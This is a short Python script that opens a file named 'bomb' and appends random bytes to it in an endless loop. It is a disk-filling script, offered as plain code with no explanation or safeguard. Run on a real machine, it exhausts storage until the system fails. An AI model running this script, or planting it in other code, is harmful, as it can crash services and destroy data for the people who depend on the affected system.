import os

with open("bomb", "ab") as fl:
    while True:
        fl.write(os.getrandom(64))


